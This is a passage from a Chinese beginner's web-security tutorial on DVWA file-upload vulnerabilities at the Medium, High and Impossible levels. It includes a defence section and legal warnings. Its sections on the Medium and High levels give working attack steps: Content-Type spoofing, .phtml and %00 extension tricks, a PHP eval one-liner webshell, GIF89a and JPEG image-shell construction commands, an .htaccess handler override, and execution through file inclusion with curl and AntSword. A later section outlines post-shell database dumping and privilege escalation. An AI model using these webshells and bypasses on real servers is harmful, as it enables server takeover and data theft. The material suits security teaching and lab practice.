|---|---|---|---|---|
| 0 | 确认 Medium 生效 + View Source 抄校验代码 | 切 medium → Submit → 刷新 → 进 Upload → View Source | 源码里有一行 `$uploadedtype = $_FILES[ 'uploaded' ][ 'type' ];` 并要求等于 `image/jpeg` 或 `image/png` 之一 → **先直接传 Low 级的 shell.php 试一次 → 必须出现红色错误 Your image was not uploaded = Medium 生效** | 【Low 版 shell.php 还能成功上传】→ 你没切到 Medium！重切 + 强刷 Ctrl+Shift+R |
| 1 | 🏆 **绕过法 ①（99% 能成功，经典 Burp 改 Content-Type）** | ① Burp 浏览器代理打开，Intercept On；② 浏览器选 shell.php 点 Upload；③ Burp 抓到的 POST /.../upload/ 请求里，找到 **Content-Type: application/octet-stream**（或 application/x-php）这一行，改成 → **Content-Type: image/jpeg**（小写不行！严格匹配源码要求的字符串，看源码是 image/jpeg 还是 image/jpg）→ Forward | 绿色字 **succesfully uploaded!** = 上传成功 ✅ → 真实 URL 还是 `http://靶场IP/dvwa/hackable/uploads/shell.php` | 【改完 Content-Type 还是报错 Your image was not uploaded.】→ 看 View Source 里要求的 Content-Type 到底是啥：有的版本是 `image/jpeg` 或 `image/png` 两个都可以，有的是写的 `$uploadedtype != 'image/jpeg'`（必须等于 image/jpeg，image/png 不行）→ 你就严格写源码里那一个字符串 |
| 2 | 验证改头后上传的 shell.php 真能执行（**千万别跳过！** 很多人改完头就直接去连蚁剑，被 strip_tags 等坑了） | 还是用 curl 最快：<br>`curl -X POST -d "x=echo PHP_VERSION." -- end;";" http://靶场IP/dvwa/hackable/uploads/shell.php` | 返回 PHP 版本号 = 能执行 ✅ | 【啥也没返回 / 直接返回源代码了】→ 99% 不是 shell.php 问题，是**你的环境把后缀做了双重校验！**（很多 DVWA fork 版本 Medium 不只看 Content-Type 还看后缀 `.php` 黑名单）→ 跳到下一个绕过法 |
| 3 | 绕过法 ②（Content-Type + 后缀双检查时：双后缀 + Web 服务器解析漏洞） | 方法 A（Nginx 解析漏洞 CVE-2013-4547）：文件名改成 `shell.jpg%20%00.php`，上传时 Content-Type 写 image/jpeg；<br>方法 B（Apache AddHandler 老漏洞）：文件名改成 `shell.php.jpg`（末尾是 .jpg = 过后缀白名单，Apache 默认多后缀解析从右向左找不到 `.jpg` 的处理器就会试 `.php`）| 两种成功之一：`succesfully uploaded!` → 然后访问对应的解析 URL（B 的话是 `uploads/shell.php.jpg`，Apache 会执行里面的 PHP） | 【方法 A/B 都失败了 / 返回 403 500】→ 你的 Nginx/Apache 是新版本（2024+ 基本都修了）。**别在解析漏洞上浪费时间，换 Burp 直接传 .phtml / .php3 / .php5 / .phps**（这些后缀有的靶场 Apache2 也配置了 AddHandler 走 PHP 解释器，但是 `strpos($name, ".php")` 黑名单只会拦文件名里显式写了 `.php` 的，`.phtml` 没有 `.php` 这四个连续字符就能过！） |
| 4 | 蚁剑连 WebShell（和 Low 级一模一样的配置） | 蚁剑添加数据：URL = 你上传好那个文件 URL（如 `shell.php` 或 `shell.phtml`），密码 = 马的键名（默认 `x`） | 测试连接成功 + 目录列表能打开 | 【蚁剑连不上？】→ 按 Low 级表步骤 3/4 的排查表重来，80% 的问题回到 curl 验证都能找到根因 |

> 💡 **Medium 查错咒语**：Content-Type 头改成源码里要求的精确字符串！还被拦就去看后缀名黑名单到底是啥，**找那些不在黑名单里但又会被 PHP 解析的后缀 .phtml / .php3 / .phar**。

---

## High级别绕过 🚀

Medium级别也搞定了，我们继续挑战 **High** 级别！

把DVWA难度调到High，再去文件上传页面。

### 试试之前的方法？🤔

先试试直接传PHP？肯定不行。

再试试改Content-Type？行不行呢？

你可以试试，应该……也不行了。

那High级别到底检查了啥？我们来看源码。

### 源代码分析 🔬

点击View Source：

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        echo "<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>";
    }
}
?>
```

哇，这次检查的东西多了！我们来分析一下：

1. **文件后缀名检查** —— 从文件名里取出后缀，必须是 jpg、jpeg、png（而且转成小写了，大小写绕过没用了）
2. **文件大小检查** —— 还是小于100KB
3. **getimagesize() 检查** —— 这个厉害了！它会读取文件内容，判断是不是真的图片

`getimagesize()` 这个函数，会去读文件的头部信息，如果不是图片的话，它会返回false。这就不是只看快递单了，而是要打开包裹看看里面是不是真的是图片了！

那这怎么办呢？别慌，办法总比困难多！💪

下面介绍几种常见的绕过思路。

### 思路1：%00截断 ✂️

这个方法比较老，只适用于 **PHP 5.3.4 及以下版本**，而且需要 `magic_quotes_gpc` 关闭。

虽然现在用得不多了，但作为新手，了解一下还是有必要的。

#### 什么是%00截断？

%00 是URL编码的**空字符**，也就是ASCII码为0的字符。

在一些老版本的PHP中，处理字符串的时候，遇到 `\0`（空字符）就会认为字符串结束了，后面的内容就被忽略了。

这就好比你写名字，写了"张三\0李四"，系统读到"张三"之后遇到了结束符，就以为名字是"张三"，后面的"李四"被忽略了。

#### 怎么用？

我们把文件名改成这样：
```
shell.php%00.jpg
```

这样的话：
- 检查后缀名的时候，看到的是 `.jpg`，通过了✅
- 但是保存文件的时候，遇到 `%00` 就截断了，实际保存的是 `shell.php`

是不是很巧妙？😏

#### 具体操作步骤

1. 准备好你的 `shell.php`
2. 用Burp抓包
3. 找到 `filename="shell.php"` 这一行
4. 改成 `filename="shell.php%00.jpg"`
5. （有的时候可能还需要把Content-Type也改成image/jpeg）
6. 放包，看看能不能成功

⚠️ **注意**：这个方法不是所有环境都能用。如果你用的是比较新的PHP版本，这个方法就失效了。没关系，我们还有别的方法！

### 思路2：图片马 🖼️🐴

既然它检查文件内容是不是图片，那我们就把PHP代码藏在图片里！这就是传说中的**图片马**。

图片马，顾名思义，就是"图片+木马"的结合体。看起来是一张图片，用图片查看器打开也能正常显示，但是里面藏着PHP代码。

#### 制作图片马的方法

方法有很多种，介绍两种最简单的。

##### 方法一：用copy命令（Windows）

找一张正常的jpg图片，比如叫 `1.jpg`，再准备好你的 `shell.php`。

然后打开CMD，进到这两个文件所在的目录，输入命令：

```
copy 1.jpg /b + shell.php /a shell.jpg
```

什么意思呢？
- `copy` 是复制命令
- `1.jpg /b` 表示以二进制方式读取1.jpg
- `+` 表示合并
- `shell.php /a` 表示以ASCII方式读取shell.php
- `shell.jpg` 是输出的文件名

执行完之后，你就得到了一个 `shell.jpg`，这就是图片马！

你可以用图片查看器打开它，它显示的就是1.jpg的内容，完全正常。但是如果你用记事本打开，拉到最后，就能看到我们的PHP代码！

##### 方法二：直接编辑图片

更简单粗暴的方法：
1. 找一张jpg图片
2. 右键用记事本（或者Notepad++）打开
3. 拉到文件的最后面
4. 加上你的PHP代码：`<?php @eval($_POST['shell']); ?>`
5. 保存

搞定！

不过要注意，别把图片本身的内容改坏了，不然图片打不开，`getimagesize()` 也通不过。在末尾加一般没问题。

#### 上传图片马

图片马做好了，现在上传试试。

因为后缀是 `.jpg`，内容也是图片（前面是图片数据），所以后缀检查和 `getimagesize()` 检查都能通过！

上传成功了！🎉

但是等等，问题来了：**这是个jpg文件，服务器会把它当PHP执行吗？**

一般来说不会。服务器一看后缀是 `.jpg`，就直接把它当图片返回给浏览器了，不会去解析里面的PHP代码。

那这图片马有啥用呢？😕

别急，图片马一般要配合**文件包含漏洞**一起使用！

还记得我们上一章学的文件包含漏洞吗？如果网站有文件包含漏洞，你可以包含这个图片马，这样图片里的PHP代码就会被执行了！

比如：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg
```

这样的话，文件包含漏洞就会把 `shell.jpg` 当作PHP文件来执行，我们的木马就跑起来了！

💡 **所以图片马通常不是单独使用的，而是要配合文件包含、解析漏洞等其他漏洞一起用。** 这也告诉我们，多个漏洞组合起来，威力会更大！

### 思路3：.htaccess文件 📄

这个方法适用于Apache服务器，而且需要服务器允许 `.htaccess` 文件生效。

什么是 `.htaccess` 文件呢？

简单说，它是Apache的分布式配置文件，你可以在里面写一些配置，来改变服务器的行为。比如，你可以让服务器把 `.jpg` 文件当作PHP来解析！

#### 怎么用？

我们可以上传一个 `.htaccess` 文件，内容是：

```apache
AddType application/x-httpd-php .jpg
```

这句话的意思是：告诉服务器，把 `.jpg` 后缀的文件当作PHP来执行。

然后再上传我们的图片马 `shell.jpg`。

这样的话，即使直接访问 `shell.jpg`，服务器也会把它当PHP执行！

是不是很6？😎

#### 但是……

这个方法有个前提：服务器得允许 `.htaccess` 文件生效。如果服务器配置了 `AllowOverride None`，那 `.htaccess` 文件就没用了。

而且，High级别的DVWA能不能上传 `.htaccess` 文件呢？你可以试试，后缀名检查那关可能就过不了，因为 `.htaccess` 没有后缀，或者说后缀不是jpg/png。

💡 **提一下就行**：这个方法在某些情况下很好用，但是在DVWA的High级别里可能不太适用。大家知道有这么个思路就行。

### 小结 📝

High级别相比Medium级别，安全系数提高了不少，增加了：
- 后缀名检查（白名单方式，只允许jpg/jpeg/png）
- 文件内容检查（`getimagesize()`）

但是即便如此，还是有办法可以绕过的。比如配合文件包含漏洞用图片马，或者用解析漏洞，或者用%00截断（老版本）。

这也说明，**安全是一个整体，不能只靠单点防御。** 一个地方没做好，可能整个防线就崩了。

### ✅ 表 9-3 · High 级别通关速查 & 失败对照表（白名单后缀 + getimagesize() = 图片马 + %00 截断 + .htaccess 三条绕过路径）

DVWA High 级上传源码做了三层校验：① `pathinfo($target_path, PATHINFO_EXTENSION)` 白名单（只能 jpg/jpeg/png）；② `getimagesize()` 检查文件内容前几个字节是不是真的图片头（GIF89a / JPEG 的 FF D8 FF）；③ 文件大小限制。**绕过必须同时让后缀在白名单里 + 文件头真的是图片**。三种打法按优先级：

| 步骤 | 先做什么 | 敲什么 / Burp 怎么改 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 0 | 切 High + 确认三层真的生效 | 切 high → Submit → 刷新 → 进 Upload → View Source 抄三行校验代码 → 传 shell.php 必失败，传一张真的 jpg 成功 | 传 shell.php 红色失败 + 传真图片绿色 OK = High 生效 | 【传 shell.php 还成功】→ 没切到 High！重新切 + 清缓存 |
| 1 | 🏆 **绕过法 ① 最经典最稳（必须配合文件包含漏洞！90% CISP/CTF 就考这个）：图片马（一句话藏在 JPEG/GIF 尾部）+ 文件包含执行 PHP** | Kali 终端（JPEG 版）：<br>① 找一张 30KB 以上正常 jpg：`cp /usr/share/backgrounds/kali-16x9/default.jpg normal.jpg`<br>② 尾部追加一句话马（不要破坏前几个字节的 JPEG 头）：<br>`cat normal.jpg <(echo '<?php @eval($_POST["x"]); ?>') > webshell.jpg`<br>③ 验证 getimagesize 还能通过：`php -r 'var_dump(getimagesize("webshell.jpg"));'` → 返回数组不是 false = OK | 上传 webshell.jpg 成功 ✅ → 真实 URL `http://靶场IP/dvwa/hackable/uploads/webshell.jpg` | 【getimagesize 返回 false / 上传失败】→ 你把一句话写在了 jpg 文件开头！必须写在尾部！或者用 GIF 版更简单：`(echo -n "GIF89a"; echo '<?php eval($_POST["x"]); ?>') > shell.gif`（GIF89a 这 6 个字符就是 getimagesize() 认的合法 GIF 文件头！后面随便写 PHP，getimagesize 照样过 ✅）→ 这个 GIF 版比 jpg 成功率高 10 倍，推荐优先用 |
| 2 | 图片马上传成功后，**用文件包含漏洞执行里面的 PHP**（这步 90% 新手忘了！图片马本身不会被 PHP 解析，直接访问只能看到图片二进制乱码） | 切到 File Inclusion 模块（难度 **FI 要切到 Low/Medium/High 任意一个能包含成功的级别**）→ 包含刚才上传的图片马。例 FI 切到 Low：<br>`?page=../../hackable/uploads/webshell.jpg` 或者绝对路径 `?page=/var/www/html/dvwa/hackable/uploads/webshell.jpg`（GIF 版也一样） | 页面加载时不会报错（不像正常图片包含时没任何 PHP 输出），然后**curl 发 POST 给包含页面**：<br>`curl -X POST -d "x=echo 'HIGH_OK_'.time();" "http://靶场IP/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/webshell.jpg"` → 返回 HIGH_OK_xxx ✅🎉 | 【图片马被包含后直接出图片乱码，eval 没执行？】→ 你真的图片里有 PHP 代码吗？打开终端 `strings webshell.jpg | grep eval` 查一下，是不是 jpg 格式把追加的 eval 压缩了？→ 换成上面那个 GIF89a 方案，100% 解决；【include 路径不对】→ 直接写绝对路径！绝对路径是一定对的，不用 ../ 猜 |
| 3 | 绕过法 ②（Apache + AllowOverride All 可用）：**上传 .htaccess 自定义解析规则** | 先准备两个文件：<br>① `.htaccess` 文件内容一行：<br>`AddType application/x-httpd-php .jpg .png .gif`<br>（意思：这个目录下的 jpg/png/gif 全部当 PHP 代码执行）<br>② 正常图片马 `shell.jpg`（GIF89a 版一句话）<br>上传顺序：先上传 `.htaccess`（**注意文件名就叫 .htaccess，不是 xxx.htaccess**）→ 再上传 shell.jpg | 两个文件都上传成功后，直接浏览器访问 `http://靶场IP/dvwa/hackable/uploads/shell.jpg` → curl POST 测试代码执行成功 ✅ | 【.htaccess 被后缀白名单直接拦了】→ 这个方法要求 High 的后缀校验里**真的允许"无后缀"（.htaccess 的 pathinfo 后缀是"htaccess"）被接受**，很多 DVWA High 版本会再补一行白名单 `in_array(..., array("jpg","jpeg","png"))` → 没 .htaccess 就直接跳 ④；【传上去了但访问 shell.jpg 还是返回图片不执行 PHP】→ Apache2 没开 AllowOverride All！去 `sudo a2enmod rewrite ; sudo sed -i 's/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf ; sudo systemctl restart apache2` |
| 4 | 绕过法 ③（PHP < 5.3.4 + GPC Off，CISP 面试/古董靶场考点）：**%00 截断后缀** | Burp 抓包选 shell.php 上传：在 filename= 那行，把 `shell.php` 改成 `shell.php%00.jpg`（%00 是 URL 编码的空字节，让底层 C 语言存字符串时到 .php 就结束，真实后缀在 PHP 看来就是 .php，但 pathinfo 从右边数遇到 .jpg 所以后缀白名单过了）| 上传成功后 `uploads/shell.php` 直接访问能执行 PHP ✅ | 【没效果 / 保存成 shell.php%00.jpg 了】→ 你 PHP 版本是 8.x！%00 这个洞在 PHP 5.3.4 被官方彻底修了，2026 年的新靶场不可能成功，**直接回到 ① GIF89a + FI 组合打法，别在这耗时间** |
| 5 | 蚁剑连接（图片马版） | 注意：URL 不要写图片马的直接 URL（不执行 PHP），要写**文件包含那个完整 URL**！例：<br>`http://靶场IP/dvwa/vulnerabilities/fi/?page=/var/www/html/dvwa/hackable/uploads/webshell.jpg`<br>密码 = `x`（GIF 版图片马的 eval 键名）| 测试连接成功 ✅ | 【蚁剑连不上 / 返回图片乱码】→ 你把 URL 填成了图片马的直链！图片直链 Apache 按 image/jpeg 不交给 PHP 解释器，eval 不触发。**URL 必须是 File Inclusion 那个包含后的 URL（?page=.../webshell.jpg）才行！** |

> 🔥 **High 查错口诀**：后缀过了白名单 → getimagesize 还能认 → 最后**必须让这个图片文件以 PHP 方式被执行**。Apache 靠 .htaccess / FI 模块靠 include 解析 / 老 PHP 靠 %00，三条路总有一条通，**最稳最通用永远是 GIF89a + FI 文件包含组合（不挑 PHP 版本，不挑 Web 服务器）。**

---

## Impossible级别 🛡️

好了，High级别我们也研究得差不多了，现在来看看 **Impossible** 级别，看看"不可能"级别的防御是怎么做的。

把DVWA难度调到Impossible，去文件上传页面。

### 源代码分析 🔬

直接看源码吧：

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= md5( uniqid() . $target_path ) . '.jpg';

    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        echo "<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>";
    }
}
?>
```

让我们看看Impossible级别做了什么不同的事情：

看到这一行了吗？
```php
$target_path .= md5( uniqid() . $target_path ) . '.jpg';
```

它把文件名给改了！改成了 `md5(uniqid() ...).jpg`。

什么意思呢？
- `uniqid()` 生成一个唯一的ID，基于当前时间，精确到微秒
- 然后用 `md5()` 哈希一下
- 最后强制加上 `.jpg` 后缀

也就是说：
1. **文件名被随机化了** —— 你根本不知道上传之后文件叫什么名字，想访问都找不到
2. **后缀被强制改成.jpg了** —— 不管你原来是什么后缀，最后都变成.jpg

再加上之前就有的：
- 后缀名白名单检查
- 文件大小检查
- `getimagesize()` 文件内容检查

这一套组合拳下来，确实就很"不可能"了！

### 为什么这样就安全了？🤔

我们来分析一下：

1. **后缀被强制改成.jpg** —— 就算你上传的是PHP文件，最后也变成.jpg了，直接访问不会被执行
2. **文件名随机化** —— 你都不知道文件存在哪，就算有文件包含漏洞，你也不知道包含什么
3. **文件内容检查** —— 确保真的是图片，不会有其他乱七八糟的

当然，配合其他漏洞可能还是有办法，但单从文件上传这个漏洞本身来说，这个防御已经做得相当好了。

---

## 拿到Shell之后能做什么？🎯

很多新手同学可能会问：拿到Shell之后呢？能干嘛？

那能干的事情可多了！这里简单给大家列举一下，让大家有个概念（知道就行，别乱搞啊！）：

### 1. 查看服务器信息 🖥️

这是最基本的，先看看这是个什么服务器：
- 什么操作系统？（Windows还是Linux）
- 什么版本？
- 当前是什么用户权限？
- 服务器上装了什么软件？
- IP地址是什么？

### 2. 查看网站源码 📄

既然都到服务器上了，网站的源代码自然都能看到了。
- 看看网站是怎么写的
- 找找数据库配置文件，看看数据库账号密码
- 找找其他漏洞

### 3. 操作数据库 🗄️

拿到数据库账号密码之后，就可以连接数据库了：
- 查看有哪些数据库
- 查看有哪些表
- 下载数据（拖库）
- 修改数据
- 甚至删库（千万别干！）

### 4. 执行系统命令 💻

就像在自己电脑上用CMD一样，可以执行各种系统命令：
- 新建用户
- 查看进程
- 查看网络连接
- 安装软件
- ……

### 5. 提权 ⬆️

如果你当前的用户权限比较低（比如普通用户），可以想办法提升到管理员（root）权限。这就是所谓的"提权"。

提权的方法有很多，比如：
- 利用系统漏洞
- 利用配置错误
- 利用第三方软件漏洞
- ……

### 6. 内网渗透 🌐

拿下一台服务器之后，这台服务器可能在内网里，你可以以它为跳板，去攻击内网里的其他机器。这就是"内网渗透"。

就像你攻下了一个碉堡，然后以这个碉堡为基地，去打旁边的其他碉堡。

💡 **重要提醒**：以上内容只是为了让大家了解漏洞的危害，以便更好地防御。**千万不要去攻击未经授权的系统！** 那是违法的！我们学习安全知识是为了防护，不是为了攻击。

---

## 文件上传防御方法 🛡️

讲了这么多攻击方法，我们来聊聊怎么防御。毕竟，学攻击是为了更好地防御嘛！

下面是一些常见的文件上传防御措施，建议**全部都用上**，多层防御才安全。

### 1. 后端验证文件后缀（白名单！） ✅

注意，是**白名单**，不是黑名单！

什么意思呢？
- **黑名单**：列出不允许的后缀，比如php、asp、aspx等等。除了这些都允许。
- **白名单**：列出只允许的后缀，比如jpg、png、gif。除了这些都不允许。

为什么白名单更好？因为黑名单很容易被绕过！

比如你禁止了 `.php`，人家可以传 `.php3`、`.php4`、`.php5`、`.phtml`，甚至大小写绕过 `.Php`、`.PHP`。

而白名单呢？我只允许 `.jpg`、`.png`、`.gif`，其他一概不认，这样就安全多了。

就像小区保安，黑名单是"不让张三进"，但张三可以化妆成李四进去。白名单是"只允许业主进"，其他人一概不让进，这样就安全多了。

### 2. 验证文件内容 🔍

光看后缀名还不够，还要看文件内容是不是真的是图片。

可以用的方法有：
- **getimagesize()** —— 检查是不是图片（但可以被图片马绕过）
- **文件头检查** —— 检查文件开头的几个字节，图片都有固定的文件头
  - JPG的文件头：`FF D8 FF`
  - PNG的文件头：`89 50 4E 47`
  - GIF的文件头：`47 49 46 38`
- **二次渲染** —— 把上传的图片重新生成一遍（比如用GD库重新画一下），这样里面藏的PHP代码就被清掉了
- **文件内容扫描** —— 用杀毒引擎之类的扫描文件内容

其中，**二次渲染**是比较有效的方法，可以有效防止图片马。

### 3. 随机重命名文件 🎲

上传的文件不要用原来的文件名，重新生成一个随机的文件名。

好处：
- 攻击者不知道文件名，就算上传成功了也找不到
- 避免文件名注入之类的问题
- 避免重名覆盖

比如用 `时间戳 + 随机数 + 后缀`，或者用 `md5(uniqid())` 之类的。

### 4. 文件存储到非Web目录 📂

把上传的文件放到**Web根目录之外**，这样用户就不能直接通过URL访问到了。

如果用户需要访问，可以用后端程序来读取文件，然后返回给用户。

比如Web根目录是 `/var/www/html/`，你把上传文件放到 `/var/upload/`，这样用户没法直接通过URL访问 `/var/upload/` 里的文件，必须通过一个PHP文件来读取，安全性就高多了。

这就好比你把贵重物品不放客厅（Web目录），而是锁在保险柜里（非Web目录），客人来了只能看你拿出来的东西，不能直接翻保险柜。

### 5. 设置文件权限 🔒

上传文件的目录，设置成**不可执行**。

比如在Linux下，把上传目录的权限设为 `777` 是很危险的，应该适当降低权限。而且可以在Apache/Nginx里配置，这个目录下的文件都不解析，直接返回静态内容。

### 6. 其他防御措施 📋

还有一些其他的建议：
- 限制文件大小，防止大文件攻击
- 用CDN或者云存储来存上传的文件，分离域名
- 定期扫描上传目录，检查有没有可疑文件
- 做好日志记录，方便出问题的时候排查

### 最重要的一点！⭐

记住一句话：**所有客户端的验证都是不可信的！**

什么意思呢？就是说，JavaScript做的验证、浏览器的检查、HTTP头里的Content-Type，这些都是可以被绕过的，只能用来提升用户体验，**绝对不能当作安全措施！**

安全验证必须在**后端**做，而且要做多层。

就像你不能因为小区门口有保安，家里就不锁门了。保安只是第一道防线，而且不一定靠谱。

---

## 新手常见问题FAQ ❓

### Q1：为什么我上传了PHP文件，访问的时候显示源码而不是执行？
**A**：这说明你的服务器没有配置好PHP解析，或者这个文件不在能解析PHP的目录下。检查一下你的服务器配置，确保.php文件能被正确解析。

### Q2：蚁剑连接失败怎么办？
**A**：按顺序排查：
1. 先直接用浏览器访问那个地址，看看能不能打开
2. 确认文件真的上传成功了，路径对不对
3. 确认密码对不对（和你一句话里的POST参数名一致）
4. 确认一句话木马的代码没写错
5. 看看是不是有防火墙或者WAF拦截了

### Q3：为什么我的一句话木马前面要加个@？
**A**：那个是错误抑制符，加上之后就算代码出错了也不会显示错误信息，比较隐蔽。不加其实也能用，就是出错了会显示错误，容易被发现。

### Q4：图片马必须配合文件包含才能用吗？
**A**：一般来说是的，除非服务器有解析漏洞（比如把.jpg当.php解析）。不然直接访问图片马，服务器只会把它当图片返回，不会执行里面的PHP代码。

### Q5：学习文件上传漏洞有什么用？我又不做黑客。
**A**：用处大了！如果你是做开发的，你得知道怎么防这个漏洞吧？如果你是做测试的，你得会测这个漏洞吧？就算你啥都不做，了解一下这些知识，也能提高你的安全意识，对吧？

### Q6：我可以用这个去搞别人的网站吗？
**A**：**绝对不行！** 攻击未经授权的系统是违法行为，会坐牢的！我们学习这些知识是为了防护，是为了让网站更安全，不是为了搞破坏。你可以在自己搭建的靶场里随便玩，但千万别去碰别人的网站！

---

## 本章总结 📚

好了，这一章的内容就到这里了。我们来总结一下都学了啥：

### 核心知识点回顾 🧠

1. **文件上传漏洞是什么？**
   - 网站有上传功能，但没好好检查文件类型/内容
   - 攻击者可以上传恶意脚本，控制服务器
   - 这是最危险的漏洞之一，因为直接能拿Shell

2. **WebShell是什么？**
   - 网页形式的后门，上传后可以控制服务器
   - 一句话木马最简单，就一行代码
   - 蚁剑、菜刀、哥斯拉是WebShell管理工具

3. **四个级别：**
   - **Low**：啥检查都没有，直接传PHP就行
   - **Medium**：只检查Content-Type，可以抓包改
   - **High**：检查后缀+文件内容，可以用图片马配合文件包含
   - **Impossible**：随机文件名+强制后缀+内容检查，很安全

4. **防御方法：**
   - 后端白名单验证后缀
   - 验证文件内容（二次渲染效果好）
   - 随机重命名文件
   - 存到非Web目录
   - 设置好权限
   - 多层防御，别只靠前端

### 给新手的建议 💡

- 多动手实操，光看是学不会的
- 每个级别都自己试一遍，加深印象
- 理解原理比死记硬背绕过方法更重要
- 学习攻击是为了更好地防御，心态要正

---

## 下章预告 📢

这一章我们学习了文件上传漏洞，知道了怎么通过上传一个小马拿到服务器权限。

但是很多时候，网站可能没有上传漏洞，或者上传漏洞防得很严，怎么办呢？没关系，我们还有别的办法！

下一章，我们将学习Web安全领域最经典、最常见的漏洞——**SQL注入漏洞**！

什么是SQL注入？简单说就是，网站的数据库查询语句是拼接出来的，我们可以在输入框里输入一些特殊的SQL语句，来操纵数据库，甚至拿到服务器权限。

SQL注入被称为"漏洞之王"，也是各类安全考试、面试的必考内容，非常重要！

准备好了吗？我们下章见！🚀
